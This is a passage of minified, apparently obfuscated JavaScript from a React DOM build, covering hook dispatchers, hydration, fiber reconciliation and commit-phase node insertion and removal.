      oo = null, co = 0;
    }
    if (Jr.current = jo, (e = Xr).memoizedState = eo, e.expirationTime = fo, e.updateQueue = io, e.effectTag |= uo, e = null !== $r && null !== $r.next, Or = 0, ao = no = eo = Qr = $r = Xr = null, fo = 0, io = null, uo = 0, e) throw Error(o(300));
    return n;
  }
  function lo() {
    Jr.current = jo, Or = 0, ao = no = eo = Qr = $r = Xr = null, fo = 0, io = null, uo = 0, ro = false, oo = null, co = 0;
  }
  function Do() {
    var e = f, n = {};
    n.memoizedState = null, n.baseState = null, n.queue = null, n.baseUpdate = null, n.next = null;
    var a = n;
    return null === no ? eo = no = a : no = no.next = a, no;
  }
  function bo() {
    var e = f;
    if (null !== ao) ao = (no = ao).next, Qr = null !== ($r = Qr) ? $r.next : null; else {
      if (null === Qr) throw Error(o(310));
      var n = {};
      n.memoizedState = ($r = Qr).memoizedState, n.baseState = $r.baseState, n.queue = $r.queue, n.baseUpdate = $r.baseUpdate, n.next = null;
      var a = n;
      no = null === no ? eo = a : no.next = a, Qr = $r.next;
    }
    return no;
  }
  function Co(e, n) {
    return "function" == typeof n ? n(e) : n;
  }
  function mo(e) {
    var n = f, a = bo(), i = a.queue;
    if (null === i) throw Error(o(311));
    if (i.lastRenderedReducer = e, 0 < co) {
      var u = i.dispatch;
      if (null !== oo) {
        var r = oo.get(i);
        if (void 0 !== r) {
          oo.delete(i);
          var c = a.memoizedState;
          do {
            c = e(c, r.action), r = r.next;
          } while (null !== r);
          return Gi(c, a.memoizedState) || (Io = true), a.memoizedState = c, a.baseUpdate === i.last && (a.baseState = c), i.lastRenderedState = c, [c, u];
        }
      }
      return [a.memoizedState, u];
    }
    u = i.last;
    var t = a.baseUpdate;
    if (c = a.baseState, null !== t ? (null !== u && (u.next = null), u = t.next) : u = null !== u ? u.next : null, null !== u) {
      var x = r = null, s = u, l = false;
      do {
        var d = s.expirationTime;
        d < Or ? (l || (l = true, x = t, r = c), d > fo && vt(fo = d)) : (mt(d, s.suspenseConfig), c = s.eagerReducer === e ? s.eagerState : e(c, s.action)), t = s, s = s.next;
      } while (null !== s && s !== u);
      l || (x = t, r = c), Gi(c, a.memoizedState) || (Io = true), a.memoizedState = c, a.baseUpdate = x, a.baseState = r, i.lastRenderedState = c;
    }
    return [a.memoizedState, i.dispatch];
  }
  function vo(e) {
    var n = f, a = Do();
    return "function" == typeof e && (e = e()), a.memoizedState = a.baseState = e, e = (e = a.queue = {last: null, dispatch: null, lastRenderedReducer: Co, lastRenderedState: e}).dispatch = Fo.bind(null, Xr, e), [a.memoizedState, e];
  }
  function go(e) {
    return mo(Co);
  }
  function _o(e, n, a, i) {
    var u = f, r = {};
    return r.lastEffect = null, e = {tag: e, create: n, destroy: a, deps: i, next: null}, null === io ? (io = r).lastEffect = e.next = e : null === (n = io.lastEffect) ? io.lastEffect = e.next = e : (a = n.next, n.next = e, e.next = a, io.lastEffect = e), e;
  }
  function ho(e, n, a, i) {
    var u = f, r = Do();
    uo |= e, r.memoizedState = _o(n, a, void 0, void 0 === i ? null : i);
  }
  function wo(e, n, a, i) {
    var u = f, r = bo();
    i = void 0 === i ? null : i;
    var o = void 0;
    if (null !== $r) {
      var c = $r.memoizedState;
      if (o = c.destroy, null !== i && xo(i, c.deps)) return void _o(0, a, o, i);
    }
    uo |= e, r.memoizedState = _o(n, a, o, i);
  }
  function po(e, n) {
    return ho(516, 192, e, n);
  }
  function yo(e, n) {
    return wo(516, 192, e, n);
  }
  function zo(e, n) {
    var a = f;
    return "function" == typeof n ? (e = e(), n(e), function () {
      n(null);
    }) : null != n ? (e = e(), n.current = e, function () {
      n.current = null;
    }) : void 0;
  }
  function Bo() {}
  function Lo(e, n) {
    var a = f;
    return Do().memoizedState = [e, void 0 === n ? null : n], e;
  }
  function Mo(e, n) {
    var a = f, i = bo();
    n = void 0 === n ? null : n;
    var u = i.memoizedState;
    return null !== u && null !== n && xo(n, u[1]) ? u[0] : (i.memoizedState = [e, n], e);
  }
  function Fo(e, n, a) {
    var i = f;
    if (!(25 > co)) throw Error(o(301));
    var u = e.alternate, r = {};
    if (r.expirationTime = Or, r.suspenseConfig = null, r.action = a, r.eagerReducer = null, r.eagerState = null, r.next = null, e === Xr || null !== u && u === Xr) if (ro = true, e = r, null === oo && (oo = new Map), void 0 === (a = oo.get(n))) oo.set(n, e); else {
      for (n = a; null !== n.next;) n = n.next;
      n.next = e;
    } else {
      var c = it(), t = _r.suspense;
      t = {expirationTime: c = ut(c, e, t), suspenseConfig: t, action: a, eagerReducer: null, eagerState: null, next: null};
      var x = n.last;
      if (null === x) t.next = t; else {
        var s = x.next;
        null !== s && (t.next = s), x.next = t;
      }
      if (n.last = t, 0 === e.expirationTime && (null === u || 0 === u.expirationTime) && null !== (u = n.lastRenderedReducer)) try {
        var l = n.lastRenderedState, d = u(l, a);
        if (t.eagerReducer = u, t.eagerState = d, Gi(d, l)) return;
      } catch (e) {}
      rt(e, c);
    }
  }
  var Ao = {};
  Ao.readContext = or, Ao.useCallback = to, Ao.useContext = to, Ao.useEffect = to, Ao.useImperativeHandle = to, Ao.useLayoutEffect = to, Ao.useMemo = to, Ao.useReducer = to, Ao.useRef = to, Ao.useState = to, Ao.useDebugValue = to, Ao.useResponder = to, Ao.useDeferredValue = to, Ao.useTransition = to;
  var ko = {};
  ko.readContext = or, ko.useCallback = Lo, ko.useContext = or, ko.useEffect = po, ko.useImperativeHandle = function (e, n, a) {
    var i = f;
    return a = null != a ? a.concat([e]) : null, ho(4, 36, zo.bind(null, n, e), a);
  }, ko.useLayoutEffect = function (e, n) {
    return ho(4, 36, e, n);
  }, ko.useMemo = function (e, n) {
    var a = f, i = Do();
    return n = void 0 === n ? null : n, e = e(), i.memoizedState = [e, n], e;
  }, ko.useReducer = function (e, n, a) {
    var i = f, u = Do();
    return n = void 0 !== a ? a(n) : n, u.memoizedState = u.baseState = n, e = (e = u.queue = {last: null, dispatch: null, lastRenderedReducer: e, lastRenderedState: n}).dispatch = Fo.bind(null, Xr, e), [u.memoizedState, e];
  }, ko.useRef = function (e) {
    var n = f;
    return e = {current: e}, Do().memoizedState = e;
  }, ko.useState = vo, ko.useDebugValue = Bo, ko.useResponder = Wr, ko.useDeferredValue = function (e, n) {
    var a = vo(e), f = a[0], i = a[1];
    return po(function () {
      var a = _0x28ad;
      r.unstable_next(function () {
        var f = a, u = Rr.suspense;
        Rr.suspense = void 0 === n ? null : n;
        try {
          i(e);
        } finally {
          Rr.suspense = u;
        }
      });
    }, [e, n]), f;
  }, ko.useTransition = function (e) {
    var n = vo(false), a = n[0], f = n[1];
    return [Lo(function (n) {
      var a = _0x28ad;
      f(true), r.unstable_next(function () {
        var i = a, u = Rr.suspense;
        Rr.suspense = void 0 === e ? null : e;
        try {
          f(false), n();
        } finally {
          Rr.suspense = u;
        }
      });
    }, [e, a]), a];
  };
  var Eo = {};
  Eo.readContext = or, Eo.useCallback = Mo, Eo.useContext = or, Eo.useEffect = yo, Eo.useImperativeHandle = function (e, n, a) {
    var i = f;
    return a = null != a ? a.concat([e]) : null, wo(4, 36, zo.bind(null, n, e), a);
  }, Eo.useLayoutEffect = function (e, n) {
    return wo(4, 36, e, n);
  }, Eo.useMemo = function (e, n) {
    var a = f, i = bo();
    n = void 0 === n ? null : n;
    var u = i.memoizedState;
    return null !== u && null !== n && xo(n, u[1]) ? u[0] : (e = e(), i.memoizedState = [e, n], e);
  }, Eo.useReducer = mo, Eo.useRef = function () {
    var e = f;
    return bo().memoizedState;
  }, Eo.useState = go, Eo.useDebugValue = Bo, Eo.useResponder = Wr, Eo.useDeferredValue = function (e, n) {
    var a = go(), f = a[0], i = a[1];
    return yo(function () {
      var a = _0x28ad;
      r.unstable_next(function () {
        var f = a, u = Rr.suspense;
        Rr.suspense = void 0 === n ? null : n;
        try {
          i(e);
        } finally {
          Rr.suspense = u;
        }
      });
    }, [e, n]), f;
  }, Eo.useTransition = function (e) {
    var n = go(), a = n[0], f = n[1];
    return [Mo(function (n) {
      var a = _0x28ad;
      f(true), r.unstable_next(function () {
        var i = a, u = Rr.suspense;
        Rr.suspense = void 0 === e ? null : e;
        try {
          f(false), n();
        } finally {
          Rr.suspense = u;
        }
      });
    }, [e, a]), a];
  };
  var jo = Ao, So = ko, To = Eo, Po = null, Ho = null, No = false;
  function qo(e, n) {
    var a = f, i = Pt(5, null, null, 0);
    i.elementType = "DELETED", i.type = "DELETED", i.stateNode = n, i.return = e, i.effectTag = 8, null !== e.lastEffect ? (e.lastEffect.nextEffect = i, e.lastEffect = i) : e.firstEffect = e.lastEffect = i;
  }
  function Ko(e, n) {
    var a = f;
    switch (e.tag) {
      case 5:
        var i = e.type;
        return null !== (n = 1 !== n.nodeType || i.toLowerCase() !== n.nodeName.toLowerCase() ? null : n) && (e.stateNode = n, true);
      case 6:
        return null !== (n = "" === e.pendingProps || 3 !== n.nodeType ? null : n) && (e.stateNode = n, true);
      case 13:
      default:
        return false;
    }
  }
  function Uo(e) {
    var n = f;
    if (No) {
      var a = Ho;
      if (a) {
        var i = a;
        if (!Ko(e, a)) {
          if (!(a = Lf(i.nextSibling)) || !Ko(e, a)) return e.effectTag = -1025 & e.effectTag | 2, No = false, void (Po = e);
          qo(Po, i);
        }
        Po = e, Ho = Lf(a.firstChild);
      } else e.effectTag = -1025 & e.effectTag | 2, No = false, Po = e;
    }
  }
  function Zo(e) {
    var n = f;
    for (e = e.return; null !== e && 5 !== e.tag && 3 !== e.tag && 13 !== e.tag;) e = e.return;
    Po = e;
  }
  function Go(e) {
    var n = f;
    if (e !== Po) return false;
    if (!No) return Zo(e), No = true, false;
    var a = e.type;
    if (5 !== e.tag || "head" !== a && "body" !== a && !yf(a, e.memoizedProps)) for (a = Ho; a;) qo(e, a), a = Lf(a.nextSibling);
    if (Zo(e), 13 === e.tag) {
      if (!(e = null !== (e = e.memoizedState) ? e.dehydrated : null)) throw Error(o(317));
      e: {
        for (e = e.nextSibling, a = 0; e;) {
          if (8 === e.nodeType) {
            var i = e.data;
            if ("/$" === i) {
              if (0 === a) {
                Ho = Lf(e.nextSibling);
                break e;
              }
              a--;
            } else "$" !== i && "$!" !== i && "$?" !== i || a++;
          }
          e = e.nextSibling;
        }
        Ho = null;
      }
    } else Ho = Po ? Lf(e.stateNode.nextSibling) : null;
    return true;
  }
  function Yo() {
    Ho = Po = null, No = false;
  }
  var Vo = T.ReactCurrentOwner, Io = false;
  function Wo(e, n, a, i) {
    var u = f;
    n.child = null === e ? Sr(n, null, a, i) : jr(n, e.child, a, i);
  }
  function Jo(e, n, a, i, u) {
    var r = f;
    a = a.render;
    var o = n.ref;
    return rr(n, u), i = so(e, n, a, i, o, u), null === e || Io ? (n.effectTag |= 1, Wo(e, n, i, u), n.child) : (n.updateQueue = e.updateQueue, n.effectTag &= -517, e.expirationTime <= u && (e.expirationTime = 0), sc(e, n, u));
  }
  function Ro(e, n, a, i, u, r) {
    var o = f;
    if (null === e) {
      var c = a.type;
      return "function" != typeof c || Ht(c) || void 0 !== c.defaultProps || null !== a.compare || void 0 !== a.defaultProps ? ((e = qt(a.type, null, i, null, n.mode, r)).ref = n.ref, e.return = n, n.child = e) : (n.tag = 15, n.type = c, Oo(e, n, c, i, u, r));
    }
    return c = e.child, u < r && (u = c.memoizedProps, (a = null !== (a = a.compare) ? a : Vi)(u, i) && e.ref === n.ref) ? sc(e, n, r) : (n.effectTag |= 1, (e = Nt(c, i)).ref = n.ref, e.return = n, n.child = e);
  }
  function Oo(e, n, a, i, u, r) {
    var o = f;
    return null !== e && Vi(e.memoizedProps, i) && e.ref === n.ref && (Io = false, u < r) ? sc(e, n, r) : $o(e, n, a, i, r);
  }
  function Xo(e, n) {
    var a = f, i = n.ref;
    (null === e && null !== i || null !== e && e.ref !== i) && (n.effectTag |= 128);
  }
  function $o(e, n, a, i, u) {
    var r = f, o = bu(a) ? du : su.current;
    return o = Du(n, o), rr(n, u), a = so(e, n, a, i, o, u), null === e || Io ? (n.effectTag |= 1, Wo(e, n, a, u), n.child) : (n.updateQueue = e.updateQueue, n.effectTag &= -517, e.expirationTime <= u && (e.expirationTime = 0), sc(e, n, u));
  }
  function Qo(e, n, a, i, u) {
    var r = f;
    if (bu(a)) {
      var o = true;
      _u(n);
    } else o = false;
    if (rr(n, u), null === n.stateNode) null !== e && (e.alternate = null, n.alternate = null, n.effectTag |= 2), Br(n, a, i), Mr(n, a, i, u), i = true; else if (null === e) {
      var c = n.stateNode, t = n.memoizedProps;
      c.props = t;
      var x = c.context, s = a.contextType;
      s = "object" == typeof s && null !== s ? or(s) : Du(n, s = bu(a) ? du : su.current);
      var l = a.getDerivedStateFromProps, d = "function" == typeof l || "function" == typeof c.getSnapshotBeforeUpdate;
      d || "function" != typeof c.UNSAFE_componentWillReceiveProps && "function" != typeof c.componentWillReceiveProps || (t !== i || x !== s) && Lr(n, c, i, s), cr = false;
      var D = n.memoizedState;
      x = c.state = D;
      var b = n.updateQueue;
      null !== b && (mr(n, b, i, c, u), x = n.memoizedState), t !== i || D !== x || lu.current || cr ? ("function" == typeof l && (wr(n, a, l, i), x = n.memoizedState), (t = cr || zr(n, a, t, i, D, x, s)) ? (d || "function" != typeof c.UNSAFE_componentWillMount && "function" != typeof c.componentWillMount || ("function" == typeof c.componentWillMount && c.componentWillMount(), "function" == typeof c.UNSAFE_componentWillMount && c.UNSAFE_componentWillMount()), "function" == typeof c.componentDidMount && (n.effectTag |= 4)) : ("function" == typeof c.componentDidMount && (n.effectTag |= 4), n.memoizedProps = i, n.memoizedState = x), c.props = i, c.state = x, c.context = s, i = t) : ("function" == typeof c.componentDidMount && (n.effectTag |= 4), i = false);
    } else c = n.stateNode, t = n.memoizedProps, c.props = n.type === n.elementType ? t : Ou(n.type, t), x = c.context, s = "object" == typeof (s = a.contextType) && null !== s ? or(s) : Du(n, s = bu(a) ? du : su.current), (d = "function" == typeof (l = a.getDerivedStateFromProps) || "function" == typeof c.getSnapshotBeforeUpdate) || "function" != typeof c.UNSAFE_componentWillReceiveProps && "function" != typeof c.componentWillReceiveProps || (t !== i || x !== s) && Lr(n, c, i, s), cr = false, x = n.memoizedState, D = c.state = x, null !== (b = n.updateQueue) && (mr(n, b, i, c, u), D = n.memoizedState), t !== i || x !== D || lu.current || cr ? ("function" == typeof l && (wr(n, a, l, i), D = n.memoizedState), (l = cr || zr(n, a, t, i, x, D, s)) ? (d || "function" != typeof c.UNSAFE_componentWillUpdate && "function" != typeof c.componentWillUpdate || ("function" == typeof c.componentWillUpdate && c.componentWillUpdate(i, D, s), "function" == typeof c.UNSAFE_componentWillUpdate && c.UNSAFE_componentWillUpdate(i, D, s)), "function" == typeof c.componentDidUpdate && (n.effectTag |= 4), "function" == typeof c.getSnapshotBeforeUpdate && (n.effectTag |= 256)) : ("function" != typeof c.componentDidUpdate || t === e.memoizedProps && x === e.memoizedState || (n.effectTag |= 4), "function" != typeof c.getSnapshotBeforeUpdate || t === e.memoizedProps && x === e.memoizedState || (n.effectTag |= 256), n.memoizedProps = i, n.memoizedState = D), c.props = i, c.state = D, c.context = s, i = l) : ("function" != typeof c.componentDidUpdate || t === e.memoizedProps && x === e.memoizedState || (n.effectTag |= 4), "function" != typeof c.getSnapshotBeforeUpdate || t === e.memoizedProps && x === e.memoizedState || (n.effectTag |= 256), i = false);
    return ec(e, n, a, i, o, u);
  }
  function ec(e, n, a, i, u, r) {
    var o = f;
    Xo(e, n);
    var c = 0 != (64 & n.effectTag);
    if (!i && !c) return u && hu(n, a, false), sc(e, n, r);
    i = n.stateNode, Vo.current = n;
    var t = c && "function" != typeof a.getDerivedStateFromError ? null : i.render();
    return n.effectTag |= 1, null !== e && c ? (n.child = jr(n, e.child, null, r), n.child = jr(n, null, t, r)) : Wo(e, n, t, r), n.memoizedState = i.state, u && hu(n, a, true), n.child;
  }
  function nc(e) {
    var n = f, a = e.stateNode;
    a.pendingContext ? vu(0, a.pendingContext, a.pendingContext !== a.context) : a.context && vu(0, a.context, false), Kr(e, a.containerInfo);
  }
  var ac = {};
  ac.dehydrated = null, ac.retryTime = 0;
  var fc, ic, uc, rc = ac;
  function oc(e, n, a) {
    var i, u = f, r = n.mode, o = n.pendingProps, c = Vr.current, t = false;
    if ((i = 0 != (64 & n.effectTag)) || (i = 0 != (2 & c) && (null === e || null !== e.memoizedState)), i ? (t = true, n.effectTag &= -65) : null !== e && null === e.memoizedState || void 0 === o.fallback || true === o.unstable_avoidThisFallback || (c |= 1), cu(Vr, 1 & c), null === e) {
      if (void 0 !== o.fallback && Uo(n), t) {
        if (t = o.fallback, (o = Kt(null, r, 0, null)).return = n, 0 == (2 & n.mode)) for (e = null !== n.memoizedState ? n.child.child : n.child, o.child = e; null !== e;) e.return = o, e = e.sibling;
        return (a = Kt(t, r, a, null)).return = n, o.sibling = a, n.memoizedState = rc, n.child = o, a;
      }
      return r = o.children, n.memoizedState = null, n.child = Sr(n, null, r, a);
    }
    if (null !== e.memoizedState) {
      if (r = (e = e.child).sibling, t) {
        if (o = o.fallback, (a = Nt(e, e.pendingProps)).return = n, 0 == (2 & n.mode) && (t = null !== n.memoizedState ? n.child.child : n.child) !== e.child) for (a.child = t; null !== t;) t.return = a, t = t.sibling;
        return (r = Nt(r, o, r.expirationTime)).return = n, a.sibling = r, a.childExpirationTime = 0, n.memoizedState = rc, n.child = a, r;
      }
      return a = jr(n, e.child, o.children, a), n.memoizedState = null, n.child = a;
    }
    if (e = e.child, t) {
      if (t = o.fallback, (o = Kt(null, r, 0, null)).return = n, o.child = e, null !== e && (e.return = o), 0 == (2 & n.mode)) for (e = null !== n.memoizedState ? n.child.child : n.child, o.child = e; null !== e;) e.return = o, e = e.sibling;
      return (a = Kt(t, r, a, null)).return = n, o.sibling = a, a.effectTag |= 2, o.childExpirationTime = 0, n.memoizedState = rc, n.child = o, a;
    }
    return n.memoizedState = null, n.child = jr(n, e, o.children, a);
  }
  function cc(e, n) {
    var a = f;
    e.expirationTime < n && (e.expirationTime = n);
    var i = e.alternate;
    null !== i && i.expirationTime < n && (i.expirationTime = n), ur(e.return, n);
  }
  function tc(e, n, a, i, u, r) {
    var o = f, c = e.memoizedState, t = {};
    t.isBackwards = n, t.rendering = null, t.last = i, t.tail = a, t.tailExpiration = 0, t.tailMode = u, t.lastEffect = r, null === c ? e.memoizedState = t : (c.isBackwards = n, c.rendering = null, c.last = i, c.tail = a, c.tailExpiration = 0, c.tailMode = u, c.lastEffect = r);
  }
  function xc(e, n, a) {
    var i = f, u = n.pendingProps, r = u.revealOrder, o = u.tail;
    if (Wo(e, n, u.children, a), 0 != (2 & (u = Vr.current))) u = 1 & u | 2, n.effectTag |= 64; else {
      if (null !== e && 0 != (64 & e.effectTag)) e: for (e = n.child; null !== e;) {
        if (13 === e.tag) null !== e.memoizedState && cc(e, a); else if (19 === e.tag) cc(e, a); else if (null !== e.child) {
          e.child.return = e, e = e.child;
          continue;
        }
        if (e === n) break e;
        for (; null === e.sibling;) {
          if (null === e.return || e.return === n) break e;
          e = e.return;
        }
        e.sibling.return = e.return, e = e.sibling;
      }
      u &= 1;
    }
    if (cu(Vr, u), 0 == (2 & n.mode)) n.memoizedState = null; else switch (r) {
      case "forwards":
        for (a = n.child, r = null; null !== a;) null !== (e = a.alternate) && null === Ir(e) && (r = a), a = a.sibling;
        null === (a = r) ? (r = n.child, n.child = null) : (r = a.sibling, a.sibling = null), tc(n, false, r, a, o, n.lastEffect);
        break;
      case "backwards":
        for (a = null, r = n.child, n.child = null; null !== r;) {
          if (null !== (e = r.alternate) && null === Ir(e)) {
            n.child = r;
            break;
          }
          e = r.sibling, r.sibling = a, a = r, r = e;
        }
        tc(n, true, a, null, o, n.lastEffect);
        break;
      case "together":
        tc(n, false, null, null, void 0, n.lastEffect);
        break;
      default:
        n.memoizedState = null;
    }
    return n.child;
  }
  function sc(e, n, a) {
    var i = f;
    null !== e && (n.dependencies = e.dependencies);
    var u = n.expirationTime;
    if (0 !== u && vt(u), n.childExpirationTime < a) return null;
    if (null !== e && n.child !== e.child) throw Error(o(153));
    if (null !== n.child) {
      for (a = Nt(e = n.child, e.pendingProps, e.expirationTime), n.child = a, a.return = n; null !== e.sibling;) e = e.sibling, (a = a.sibling = Nt(e, e.pendingProps, e.expirationTime)).return = n;
      a.sibling = null;
    }
    return n.child;
  }
  function lc(e) {
    e.effectTag |= 4;
  }
  function dc(e, n) {
    var a = f;
    switch (e.tailMode) {
      case "hidden":
        n = e.tail;
        for (var i = null; null !== n;) null !== n.alternate && (i = n), n = n.sibling;
        null === i ? e.tail = null : i.sibling = null;
        break;
      case "collapsed":
        i = e.tail;
        for (var u = null; null !== i;) null !== i.alternate && (u = i), i = i.sibling;
        null === u ? n || null === e.tail ? e.tail = null : e.tail.sibling = null : u.sibling = null;
    }
  }
  function Dc(e) {
    var n = f;
    switch (e.tag) {
      case 1:
        bu(e.type) && Cu();
        var a = e.effectTag;
        return 4096 & a ? (e.effectTag = -4097 & a | 64, e) : null;
      case 3:
        if (Ur(), mu(), 0 != (64 & (a = e.effectTag))) throw Error(o(285));
        return e.effectTag = -4097 & a | 64, e;
      case 5:
        return Gr(e), null;
      case 13:
        return ou(Vr), 4096 & (a = e.effectTag) ? (e.effectTag = -4097 & a | 64, e) : null;
      case 19:
        return ou(Vr), null;
      case 4:
        return Ur(), null;
      case 10:
        return ir(e), null;
      default:
        return null;
    }
  }
  function bc(e, n) {
    var a = f, i = {};
    return i.value = e, i.source = n, i.stack = ae(n), i;
  }
  fc = function (e, n) {
    for (var a = f, i = n.child; null !== i;) {
      if (5 === i.tag || 6 === i.tag) e.appendChild(i.stateNode); else if (4 !== i.tag && null !== i.child) {
        i.child.return = i, i = i.child;
        continue;
      }
      if (i === n) break;
      for (; null === i.sibling;) {
        if (null === i.return || i.return === n) return;
        i = i.return;
      }
      i.sibling.return = i.return, i = i.sibling;
    }
  }, ic = function (e, n, a, i, r) {
    var o = f, c = e.memoizedProps;
    if (c !== i) {
      var t, x, s = n.stateNode;
      switch (qr(Pr.current), e = null, a) {
        case "input":
          c = Ae(s, c), i = Ae(s, i), e = [];
          break;
        case "option":
          c = Pe(s, c), i = Pe(s, i), e = [];
          break;
        case "select":
          var l = {};
          l.value = void 0;
          var d = {};
          d.value = void 0, c = u({}, c, l), i = u({}, i, d), e = [];
          break;
        case "textarea":
          c = Ne(s, c), i = Ne(s, i), e = [];
          break;
        default:
          "function" != typeof c.onClick && "function" == typeof i.onClick && (s.onclick = bf);
      }
      for (t in lf(a, i), a = null, c) if (!i.hasOwnProperty(t) && c.hasOwnProperty(t) && null != c[t]) if ("style" === t) for (x in s = c[t]) s.hasOwnProperty(x) && (a || (a = {}), a[x] = ""); else "dangerouslySetInnerHTML" !== t && "children" !== t && "suppressContentEditableWarning" !== t && "suppressHydrationWarning" !== t && "autoFocus" !== t && (D.hasOwnProperty(t) ? e || (e = []) : (e = e || []).push(t, null));
      for (t in i) {
        var b = i[t];
        if (s = null != c ? c[t] : void 0, i.hasOwnProperty(t) && b !== s && (null != b || null != s)) if ("style" === t) if (s) {
          for (x in s) !s.hasOwnProperty(x) || b && b.hasOwnProperty(x) || (a || (a = {}), a[x] = "");
          for (x in b) b.hasOwnProperty(x) && s[x] !== b[x] && (a || (a = {}), a[x] = b[x]);
        } else a || (e || (e = []), e.push(t, a)), a = b; else "dangerouslySetInnerHTML" === t ? (b = b ? b.__html : void 0, s = s ? s.__html : void 0, null != b && s !== b && (e = e || []).push(t, "" + b)) : "children" === t ? s === b || "string" != typeof b && "number" != typeof b || (e = e || []).push(t, "" + b) : "suppressContentEditableWarning" !== t && "suppressHydrationWarning" !== t && (D.hasOwnProperty(t) ? (null != b && Df(r, t), e || s === b || (e = [])) : (e = e || []).push(t, b));
      }
      a && (e = e || []).push("style", a), r = e, (n.updateQueue = r) && lc(n);
    }
  }, uc = function (e, n, a, f) {
    a !== f && lc(n);
  };
  var Cc = "function" == typeof WeakSet ? WeakSet : Set;
  function mc(e, n) {
    var a = f, i = n.source, u = n.stack;
    null === u && null !== i && (u = ae(i)), null !== i && ne(i.type), n = n.value, null !== e && 1 === e.tag && ne(e.type);
    try {
      console.error(n);
    } catch (e) {
      setTimeout(function () {
        throw e;
      });
    }
  }
  function vc(e) {
    var n = f, a = e.ref;
    if (null !== a) if ("function" == typeof a) try {
      a(null);
    } catch (n) {
      At(e, n);
    } else a.current = null;
  }
  function gc(e, n) {
    var a = f;
    switch (n.tag) {
      case 0:
      case 11:
      case 15:
        _c(2, 0, n);
        break;
      case 1:
        if (256 & n.effectTag && null !== e) {
          var i = e.memoizedProps, u = e.memoizedState;
          n = (e = n.stateNode).getSnapshotBeforeUpdate(n.elementType === n.type ? i : Ou(n.type, i), u), e.__reactInternalSnapshotBeforeUpdate = n;
        }
        break;
      case 3:
      case 5:
      case 6:
      case 4:
      case 17:
        break;
      default:
        throw Error(o(163));
    }
  }
  function _c(e, n, a) {
    var i = f;
    if (null !== (a = null !== (a = a.updateQueue) ? a.lastEffect : null)) {
      var u = a = a.next;
      do {
        if (0 != (u.tag & e)) {
          var r = u.destroy;
          u.destroy = void 0, void 0 !== r && r();
        }
        0 != (u.tag & n) && (r = u.create, u.destroy = r()), u = u.next;
      } while (u !== a);
    }
  }
  function hc(e, n, a) {
    var i = f;
    switch ("function" == typeof St && St(n), n.tag) {
      case 0:
      case 11:
      case 14:
      case 15:
        if (null !== (e = n.updateQueue) && null !== (e = e.lastEffect)) {
          var u = e.next;
          Gu(97 < a ? 97 : a, function () {
            var e = i, a = u;
            do {
              var f = a.destroy;
              if (void 0 !== f) {
                var r = n;
                try {
                  f();
                } catch (e) {
                  At(r, e);
                }
              }
              a = a.next;
            } while (a !== u);
          });
        }
        break;
      case 1:
        vc(n), "function" == typeof (a = n.stateNode).componentWillUnmount && function (e, n) {
          var a = i;
          try {
            n.props = e.memoizedProps, n.state = e.memoizedState, n.componentWillUnmount();
          } catch (n) {
            At(e, n);
          }
        }(n, a);
        break;
      case 5:
        vc(n);
        break;
      case 4:
        zc(e, n, a);
    }
  }
  function wc(e) {
    var n = f, a = e.alternate;
    e.return = null, e.child = null, e.memoizedState = null, e.updateQueue = null, e.dependencies = null, e.alternate = null, e.firstEffect = null, e.lastEffect = null, e.pendingProps = null, e.memoizedProps = null, null !== a && wc(a);
  }
  function pc(e) {
    var n = f;
    return 5 === e.tag || 3 === e.tag || 4 === e.tag;
  }
  function yc(e) {
    var n = f;
    e: {
      for (var a = e.return; null !== a;) {
        if (pc(a)) {
          var i = a;
          break e;
        }
        a = a.return;
      }
      throw Error(o(160));
    }
    switch (a = i.stateNode, i.tag) {
      case 5:
        var u = false;
        break;
      case 3:
      case 4:
        a = a.containerInfo, u = true;
        break;
      default:
        throw Error(o(161));
    }
    16 & i.effectTag && (Oe(a, ""), i.effectTag &= -17);
    e: n: for (i = e;;) {
      for (; null === i.sibling;) {
        if (null === i.return || pc(i.return)) {
          i = null;
          break e;
        }
        i = i.return;
      }
      for (i.sibling.return = i.return, i = i.sibling; 5 !== i.tag && 6 !== i.tag && 18 !== i.tag;) {
        if (2 & i.effectTag) continue n;
        if (null === i.child || 4 === i.tag) continue n;
        i.child.return = i, i = i.child;
      }
      if (!(2 & i.effectTag)) {
        i = i.stateNode;
        break e;
      }
    }
    for (var r = e;;) {
      var c = 5 === r.tag || 6 === r.tag;
      if (c) {
        var t = c ? r.stateNode : r.stateNode.instance;
        if (i) if (u) {
          var x = t;
          t = i, 8 === (c = a).nodeType ? c.parentNode.insertBefore(x, t) : c.insertBefore(x, t);
        } else a.insertBefore(t, i); else u ? (8 === (x = a).nodeType ? (c = x.parentNode).insertBefore(t, x) : (c = x).appendChild(t), null != (x = x._reactRootContainer) || null !== c.onclick || (c.onclick = bf)) : a.appendChild(t);
      } else if (4 !== r.tag && null !== r.child) {
        r.child.return = r, r = r.child;
        continue;
      }
      if (r === e) break;
      for (; null === r.sibling;) {
        if (null === r.return || r.return === e) return;
        r = r.return;
      }
      r.sibling.return = r.return, r = r.sibling;
    }
  }
  function zc(e, n, a) {
    for (var i, u, r = f, c = n, t = false;;) {
      if (!t) {
        t = c.return;
        e: for (;;) {
          if (null === t) throw Error(o(160));
          switch (i = t.stateNode, t.tag) {
            case 5:
              u = false;
              break e;
            case 3:
            case 4:
              i = i.containerInfo, u = true;
              break e;
          }
          t = t.return;
        }
        t = true;
      }
      if (5 === c.tag || 6 === c.tag) {
        e: for (var x = e, s = c, l = a, d = s;;) if (hc(x, d, l), null !== d.child && 4 !== d.tag) d.child.return = d, d = d.child; else {
          if (d === s) break;
          for (; null === d.sibling;) {
            if (null === d.return || d.return === s) break e;
            d = d.return;
          }
          d.sibling.return = d.return, d = d.sibling;
        }
        u ? (x = i, s = c.stateNode, 8 === x.nodeType ? x.parentNode.removeChild(s) : x.removeChild(s)) : i.removeChild(c.stateNode);
      } else if (4 === c.tag) {
        if (null !== c.child) {
          i = c.stateNode.containerInfo, u = true, c.child.return = c, c = c.child;
          continue;
        }
      } else if (hc(e, c, a), null !== c.child) {
        c.child.return = c, c = c.child;
        continue;
      }
      if (c === n) break;
      for (; null === c.sibling;) {
        if (null === c.return || c.return === n) return;
        4 === (c = c.return).tag && (t = false);
      }
      c.sibling.return = c.return, c = c.sibling;
    }
  }
  function Bc(e, n) {
    var a = f;
    switch (n.tag) {
      case 0:
      case 11:
      case 14:
      case 15:
        _c(4, 8, n);
        break;
      case 1:
        break;
      case 5:
        var i = n.stateNode;
        if (null != i) {
          var u = n.memoizedProps, r = null !== e ? e.memoizedProps : u;
          e = n.type;
          var c = n.updateQueue;
          if (n.updateQueue = null, null !== c) {
